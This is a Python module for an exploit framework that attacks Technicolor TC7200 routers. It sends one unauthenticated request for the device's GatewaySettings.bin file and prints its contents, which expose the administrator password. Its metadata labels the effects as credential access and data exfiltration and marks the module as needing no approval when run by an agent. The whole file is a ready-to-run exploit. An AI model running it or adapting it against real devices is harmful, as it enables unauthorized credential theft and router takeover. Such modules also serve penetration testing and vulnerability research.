#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Technicolor TC7200 Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Technicolor TC7200 Password Disclosure',
        'description': "Module exploits Technicolor TC7200 password disclosure vulnerability which allows fetching administration\\'s password.",
        'author': ['Jeroen - IT Nerdbox', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/31894/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/goform/system/GatewaySettings.bin",
        )
        if response is None:
            return

        if response.status_code == 200 and "0MLog" in response.text:
            print_success("Exploit success")
            print_status("Reading GatewaySettings.bin...")
            print_info(response.text)
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/goform/system/GatewaySettings.bin"
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "0MLog" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
